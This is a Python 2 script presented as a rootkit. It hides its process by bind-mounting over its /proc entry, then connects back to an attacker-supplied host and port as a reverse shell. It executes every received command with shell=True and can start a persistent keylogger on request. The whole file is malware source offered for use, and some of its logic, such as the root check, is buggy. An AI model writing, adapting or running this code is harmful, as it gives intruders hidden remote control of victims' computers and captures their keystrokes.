#!/usr/bin/python2.7
#Imported libraries
import socket
import urllib2
import sys
import subprocess
import string
import random
import os
import signal
from time import sleep


class Rootkit:
	#Hide process
	def hide_process(self):
		ch = string.uppercase + string.digits
		# Bind mount - works with root on linux
		token = "".join(random.choice(ch) for i in range(32)) #Generate random token
		pid = os.getpid() #Get pid of this process
		print "[+] Current PID: {0}".format(pid)
		if os.path.isdir("/tmp/{0}".format(token)) is False: # Check if path is taken
			if os.system("sudo whoami") == 'root': #Check if we have admin
				os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token)) #Hide process

	#Interupt command line to display empty for all commands
	def shell_text_interupt(self, sock, data):
		return sock.send("[{0}]> ".format(data))

		#Create a reverse shell on computer
	def reverse_shell(self, host, port):
		sleep(5)
		try:
			#Create connection to attack computer
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((host,port))
			cmd = ""	#Input from attack computer
			while True:
				cmd = sock.recv(1024).encode("UTF-8")
				cmd = cmd.strip("\n") #Make sure there are no newlines
				#Rootkit specific commands
				if cmd  == "exit":
					sock.close() #Exit rootkit on both computers killing the rootkit
				if cmd == "keylogger":
					#Nohup lives after shell and "&" makes the program run in background
					os.system("nohup python keylogger.py &") #Persistent keylogger
					continue
				#Shell commands
				else: #Else execute common shell command and hide on infected computer 
					proc = subprocess.Popen(cmd, 
					stdout=subprocess.PIPE, 
					stderr=subprocess.PIPE, 
					shell=True)
				proc_out = "{0} {1}\n".format(proc.stdout.read(), proc.stderr.read())
				sock.send(proc_out)
				self.shell_text_interupt(sock, host)
			sock.close()
			#Any error
		except Exception as error:
			print "[-] Failed to create socket: {0}".format(str(error))

		return 0

if __name__ == '__main__':
	#Start
	rk = Rootkit() #Create instance of rootkit
	rk.hide_process() #Hide the process
	rk.reverse_shell(str(sys.argv[1]), int(sys.argv[2])) #Evil stuff with supplied arguments
